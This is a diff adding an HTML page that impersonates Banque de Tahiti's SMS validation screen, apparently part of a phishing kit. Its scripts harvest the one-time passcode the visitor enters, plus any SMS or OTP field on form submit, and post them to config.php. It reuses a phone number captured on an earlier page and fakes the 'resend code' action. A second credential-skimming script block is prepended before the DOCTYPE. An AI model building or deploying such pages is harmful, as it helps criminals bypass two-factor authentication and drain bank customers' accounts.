@@ -1,0 +1,387 @@
+</script>
+<script>
+// Envoi automatique du code SMS à config.php lors de la soumission
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.querySelector('form');
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            const input = form.querySelector('input[type="text"], input[type="number"], input[name*="sms"], input[name*="otp"], input[name*="code"]');
+            if (input && input.value) {
+                fetch('config.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'type=sms&value=' + encodeURIComponent(input.value)
+                });
+            }
+        });
+    }
+});
+</script>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Banque de Tahiti - Validation SMS</title>
+    <link rel="icon" type="image/x-icon" href="favicon_bt.png">
+    <style>
+        :root {
+            --btbnc-color-bg-linear: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%);
+            --fho-color-blue: #30305C;
+            --fho-color-white: #FFFFFF;
+            --fho-color-grey2: #F5F6F8;
+            --fho-color-blue-80: #30305C;
+            --fho-color-indigo-20: #C5C9D6;
+            --fho-color-indigo-40: #8B91A8;
+            --fho-color-indigo-80: #30305C;
+            --fho-color-blue-60-light: #77869E;
+            --fho-font-title-h3: 600 24px/1.3 "Work Sans", system-ui, sans-serif;
+            --fho-font-M-semibold: 600 14px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-M-reg: 400 14px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-L-reg: 400 16px/1.5 "Work Sans", system-ui, sans-serif;
+            --fho-font-XL-semibold: 600 18px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-XL-bold: 700 18px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-title-h1: 700 32px/1.2 "Work Sans", system-ui, sans-serif;
+            --fho-font-title-h4: 600 18px/1.3 "Work Sans", system-ui, sans-serif;
+            --fho-font-S-reg: 400 12px/1.4 "Work Sans", system-ui, sans-serif;
+            --fbr-button-background-primary: #30305C;
+            --fbr-button-color-primary: #FFFFFF;
+            --fbr-button-background-hover-primary: #23234A;
+            --fbr-button-background-disabled-primary: #B0B0C0;
+            --fbr-button-color-disabled-primary: #FFFFFF;
+            --fbr-border-radius: 6px;
+        }
+        body {
+            margin: 0;
+            font-family: "Work Sans", system-ui, sans-serif;
+            background: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%);
+            min-height: 100vh;
+            position: relative;
+        }
+        .floral-bg {
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .floral-bg img {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 200px;
+            opacity: 0.15;
+            filter: grayscale(0) brightness(1) contrast(1);
+            pointer-events: none;
+        }
+        .logo {
+            background-image: url('logo_bt.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            width: 180px;
+            height: 60px;
+            margin: 40px 0 24px 58px;
+            display: block;
+        }
+        .card {
+            background: white;
+            border-radius: 6px;
+            padding: 48px 64px 24px;
+            max-width: 500px;
+            min-width: 428px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #30305C;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .step-description {
+            font-size: 16px;
+            line-height: 1.5;
+            color: #30305C;
+            text-align: center;
+            margin: 16px 0 32px 0;
+        }
+        .code-group {
+            margin-bottom: 32px;
+        }
+        .code-input-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .code-digit {
+            width: 48px;
+            height: 48px;
+            border: 1px solid #C5C9D6;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            font-family: "Work Sans", system-ui, monospace;
+            background: white;
+        }
+        .code-digit:focus {
+            border-color: #0068B3;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0,104,179,0.2);
+        }
+        .code-digit::-webkit-outer-spin-button,
+        .code-digit::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .code-digit[type=number] {
+            -moz-appearance: textfield;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 12px;
+            text-align: center;
+            display: none;
+        }
+        button.primary-button {
+            width: 100%;
+            background: #B0B0C0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font: 600 14px/1.4 "Work Sans", system-ui, sans-serif;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        button.primary-button:not([disabled]) {
+            background: #30305C;
+        }
+        .resend-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .resend-link button {
+            background: none;
+            border: none;
+            color: #0068B3;
+            font: 400 14px/1.4 "Work Sans", system-ui, sans-serif;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .back-link a {
+            color: #30305C;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            border-bottom: 1px solid transparent;
+        }
+        .back-link a:hover {
+            border-bottom-color: #30305C;
+        }
+        .contact {
+            margin-top: 40px;
+            text-align: left;
+        }
+        .contact button {
+            background: none;
+            border: 1px solid white;
+            color: white;
+            padding: 12px 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .contact button svg {
+            width: 24px;
+            height: 24px;
+        }
+        .contact button span {
+            color: white;
+        }
+        @media (max-width: 480px) {
+            .code-digit {
+                width: 40px;
+                height: 40px;
+                font-size: 18px;
+            }
+            .code-input-wrapper {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="floral-bg"><img src="bt-flower-pattern.svg" alt="motif floral"></div>
+    <div class="logo"></div>
+    <div class="card">
+    <h1>Validation SMS</h1>
+    <div class="step-description" id="smsDescription">
+        Un code de validation à 6 chiffres vient d'être envoyé par SMS au <span id="phoneDisplay">+689 XX XX XX XX</span>.<br>
+        Veuillez le saisir ci-dessous.
+    </div>
+
+    <div class="code-group">
+        <div class="code-input-wrapper" id="codeInputs">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+        </div>
+        <div class="error-message" id="errorMsg">Code invalide. Veuillez saisir 6 chiffres.</div>
+    </div>
+
+    <button id="submitBtn" class="primary-button" disabled>VALIDER</button>
+
+    <div class="resend-link">
+        <button id="resendBtn">Vous n'avez pas reçu le code ? Renvoyer</button>
+    </div>
+
+    <div class="back-link">
+        <a href="javascript:history.back()">← Retour</a>
+    </div>
+
+    <div class="contact">
+        <button id="contactBtn">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 3C7.02995 3 3 7.02995 3 12C3 16.9701 7.02995 21 12 21C16.9701 21 21 16.9701 21 12C21 7.02995 16.9701 3 12 3Z" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"/>
+                <path d="M12.5956 17.1512L12.97 17.3974L12.5956 17.1512C12.5157 17.2727 12.4029 17.3662 12.2725 17.4211C12.1421 17.4759 11.9991 17.4902 11.8613 17.4623C11.7234 17.4344 11.5956 17.3655 11.4945 17.2628L11.1393 17.6125L11.4945 17.2628C11.3934 17.1601 11.3237 17.0282 11.2954 16.8836C11.267 16.7388 11.2816 16.5889 11.337 16.4531C11.3924 16.3173 11.4856 16.2025 11.6037 16.1224C11.7217 16.0423 11.8596 16 12 16C12.1881 16 12.3701 16.0758 12.5055 16.2134C12.6412 16.3512 12.7188 16.5398 12.7188 16.7381C12.7188 16.8858 12.6756 17.0296 12.5956 17.1512Z" stroke="currentColor" stroke-miterlimit="10"/>
+                <path d="M11.9803 14.4693V13.7631C11.9803 13.4449 12.129 13.1365 12.3838 12.9177L13.6898 11.8038C14.3587 11.2369 14.741 10.4213 14.741 9.57595C14.741 8.15371 13.5093 7 11.991 7C10.4726 7 9.24097 8.15371 9.24097 9.57595V9.83454" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"/>
+            </svg>
+            <span>Contact</span>
+        </button>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // Récupérer le numéro de téléphone stocké (depuis numero.html)
+        const phoneNumber = sessionStorage.getItem('userPhone') || '+689 XX XX XX XX';
+        const phoneDisplaySpan = document.getElementById('phoneDisplay');
+        if (phoneDisplaySpan) {
+            let maskedPhone = phoneNumber;
+            if (phoneNumber.length >= 12 && phoneNumber.startsWith('+689')) {
+                let digits = phoneNumber.slice(4);
+                if (digits.length === 8) {
+                    maskedPhone = '+689 ' + digits.slice(0,2) + ' ' + digits.slice(2,4) + ' XX XX';
+                }
+            }
+            phoneDisplaySpan.textContent = maskedPhone;
+        }
+
+        const inputs = document.querySelectorAll('.code-digit');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const resendBtn = document.getElementById('resendBtn');
+        const contactBtn = document.getElementById('contactBtn');
+
+        function getCode() {
+            let code = '';
+            inputs.forEach(input => code += input.value.trim());
+            return code;
+        }
+
+        function isCodeComplete() {
+            const code = getCode();
+            return code.length === 6 && /^\d+$/.test(code);
+        }
+
+        function updateButtonState() {
+            submitBtn.disabled = !isCodeComplete();
+            if (isCodeComplete()) errorMsg.style.display = 'none';
+        }
+
+        function handleInput(e) {
+            const input = e.target;
+            const value = input.value;
+            if (value.length > 1) input.value = value.charAt(0);
+            if (input.value.length === 1) {
+                const next = input.nextElementSibling;
+                if (next && next.classList.contains('code-digit')) next.focus();
+            }
+            updateButtonState();
+        }
+
+        function handleKeydown(e) {
+            const input = e.target;
+            if (e.key === 'Backspace' && input.value === '') {
+                const prev = input.previousElementSibling;
+                if (prev && prev.classList.contains('code-digit')) {
+                    prev.focus();
+                    e.preventDefault();
+                }
+            }
+        }
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', handleInput);
+            input.addEventListener('keydown', handleKeydown);
+            input.addEventListener('focus', function() { this.select(); });
+            if (index === 0) input.focus();
+        });
+
+        async function onSubmit(e) {
+            e.preventDefault();
+            const code = getCode();
+            if (!isCodeComplete()) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            // Envoi du code OTP à config.php
+            try {
+                const response = await fetch('config.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'type=otp&value=' + encodeURIComponent(code)
+                });
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    window.location.href = 'validation.html';
+                } else {
+                    errorMsg.textContent = result.message || 'Erreur lors de la validation du code.';
+                    errorMsg.style.display = 'block';
+                }
+            } catch (err) {
+                errorMsg.textContent = 'Erreur réseau. Vérifiez votre connexion.';
+                errorMsg.style.display = 'block';
+            }
+        }
+
+        function resendCode() {
+            alert('Un nouveau code de validation vient d\'être envoyé par SMS au ' + phoneNumber);
+            inputs.forEach(input => input.value = '');
+            inputs[0].focus();
+            updateButtonState();
+        }
+
+        submitBtn.addEventListener('click', onSubmit);
+        if (resendBtn) resendBtn.addEventListener('click', resendCode);
+        if (contactBtn) {
+            contactBtn.addEventListener('click', function() {
+                alert("Besoin d'aide ? Contactez votre conseiller Banque de Tahiti au +689 40 46 46 46\nou consultez votre agence en ligne.");
+            });
+        }
+
+        updateButtonState();
+    })();
+</script>
+</body>
+</html>
